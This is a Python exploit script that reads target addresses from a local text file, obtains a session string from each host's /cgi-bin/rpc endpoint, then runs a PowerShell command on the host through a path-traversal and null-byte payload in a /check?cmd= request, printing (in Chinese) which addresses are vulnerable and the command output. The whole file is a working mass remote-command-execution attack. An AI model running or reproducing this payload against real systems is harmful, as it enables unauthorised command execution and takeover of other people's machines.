#!/usr/bin/python3
# -*- coding:utf-8 -*-
import requests
import os


class IP:
    # ip = "192.168.2.195:49676"
    cmd = "whoami"


def get_session(line):
    url = "http://" + line + "/cgi-bin/rpc"

    payload = "action=verify-haras"
    headers = {
        'Content-Type': 'text/plain'
    }

    try:
        response = requests.request("POST", url, headers=headers, data=payload)


        Cookie = response.json()["verify_string"]

        # return Cookie
        # print(response.json())
        # print(response.json()["verify_string"])

        if "verify_string" in response.json():
            url = "http://" + line + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2F" \
                                      "WindowsPowerShell%2Fv1.0%2Fpowershell.exe%20" + IP.cmd + "%00"

            payload = {}
            # print(get_session())
            headers = {
                'Connection': 'keep-alive',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': 'CID=' + Cookie,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/98.0.4758.102 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,'
                          '*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
            }

            response = requests.request("GET", url, headers=headers, data=payload)

            # print(headers)


            print("\033[1;31;40m[+] " + line + "该地址存在漏洞\033[0m")
            print("命令执行："+response.text)
        else:
            print("[-] 该地址不存在漏洞")

    except Exception as e:
        print("异常信息："+str(e))
        print("[-] " + line + "该地址不存在漏洞")


if __name__ == "__main__":
    os.system("chcp 65001")
    with open(r"C:\Users\duyada\Desktop\ip.txt",encoding="utf-8") as f:
        for line in f.readlines():
            # print(line)
            get_session(line)
            print("========================")
